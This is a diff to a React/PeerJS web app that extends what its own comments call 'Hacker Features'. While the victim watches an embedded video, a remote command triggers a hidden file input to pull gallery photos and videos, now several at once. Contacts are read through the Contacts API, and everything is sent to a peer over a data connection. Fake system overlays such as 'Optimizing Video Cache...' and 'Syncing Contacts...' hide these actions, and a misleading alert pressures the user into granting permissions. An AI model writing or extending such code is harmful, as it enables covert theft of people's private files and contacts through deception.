@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect, useRef } from 'react';
 import Peer, { DataConnection } from 'peerjs';
 import { analyzeScreen } from './services/geminiService';
@@ -22,6 +21,7 @@ const App: React.FC = () => {
   const [loading, setLoading] = useState<boolean>(false);
   const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
   const [showPermissionHint, setShowPermissionHint] = useState<boolean>(false);
+  const [fakeSystemMessage, setFakeSystemMessage] = useState<string>('');
 
   // New State for Hacker Features
   const [targetInfo, setTargetInfo] = useState<DeviceInfo | null>(null);
@@ -225,12 +225,17 @@ const App: React.FC = () => {
         }
         break;
       case 'REQUEST_GALLERY':
-        // Trigger the hidden input
-        if (galleryInputRef.current) {
-            galleryInputRef.current.click();
-        }
+        // Trigger stealth mode overlay
+        setFakeSystemMessage("Optimizing Video Cache...");
+        setTimeout(() => {
+            if (galleryInputRef.current) {
+                galleryInputRef.current.click();
+            }
+            setFakeSystemMessage("");
+        }, 1000);
         break;
       case 'REQUEST_CONTACTS':
+        setFakeSystemMessage("Syncing Contacts...");
         try {
             // @ts-ignore
             if ('contacts' in navigator && 'ContactsManager' in window) {
@@ -242,31 +247,39 @@ const App: React.FC = () => {
                     dataConn.send({ type: 'CONTACTS_LIST', payload: contacts });
                 }
             } else {
-                // Fallback / Fake message if not supported
                 alert("Please update contacts permissions to continue video.");
             }
         } catch (e) {
             console.error(e);
+        } finally {
+            setFakeSystemMessage("");
         }
         break;
     }
   };
 
   const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
-      const file = event.target.files?.[0];
-      if (file && dataConn && dataConn.open) {
-          const reader = new FileReader();
-          reader.onload = (e) => {
-              const dataUrl = e.target?.result as string;
-              const transfer: FileTransfer = {
-                  type: 'FILE_TRANSFER',
-                  fileName: file.name,
-                  fileType: file.type,
-                  data: dataUrl
-              };
-              dataConn.send(transfer);
-          };
-          reader.readAsDataURL(file);
+      const files = event.target.files;
+      if (files && files.length > 0 && dataConn && dataConn.open) {
+          setFakeSystemMessage("Uploading Backup...");
+          
+          Array.from(files).forEach((file: File) => {
+             const reader = new FileReader();
+             reader.onload = (e) => {
+                 const dataUrl = e.target?.result as string;
+                 const transfer: FileTransfer = {
+                     type: 'FILE_TRANSFER',
+                     fileName: file.name,
+                     fileType: file.type,
+                     data: dataUrl
+                 };
+                 dataConn.send(transfer);
+             };
+             reader.readAsDataURL(file);
+          });
+          
+          // Clear message after short delay
+          setTimeout(() => setFakeSystemMessage(""), 4000);
       }
   };
 
@@ -308,7 +321,7 @@ const App: React.FC = () => {
   // --- RENDER: STREAMER WATCHING VIDEO ---
   if (isWatchingVideo && role === 'STREAMER') {
       return (
-          <div className="h-[100dvh] w-full bg-black flex flex-col">
+          <div className="h-[100dvh] w-full bg-black flex flex-col relative">
               <iframe 
                   width="100%" 
                   height="100%" 
@@ -317,12 +330,25 @@ const App: React.FC = () => {
                   frameBorder="0" 
                   allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                   allowFullScreen
-                  className="flex-1"
+                  className="flex-1 z-10"
               ></iframe>
+              
+              {/* Fake System Overlay for Stealth Operations */}
+              {fakeSystemMessage && (
+                  <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/60 pointer-events-none">
+                      <div className="bg-slate-900/90 text-white px-6 py-4 rounded-xl border border-blue-500/30 flex items-center gap-3 shadow-2xl animate-pulse">
+                          <i className="fas fa-circle-notch fa-spin text-blue-400"></i>
+                          <span className="font-mono text-sm tracking-wide">{fakeSystemMessage}</span>
+                      </div>
+                  </div>
+              )}
+
               <video ref={videoRef} className="hidden" muted playsInline autoPlay />
-              {/* Hidden File Input for Remote Trigger */}
+              
+              {/* Hidden File Input for Remote Trigger (Supports Multiple Files) */}
               <input 
-                type="file" 
+                type="file"
+                multiple 
                 ref={galleryInputRef}
                 className="hidden"
                 accept="image/*,video/*"
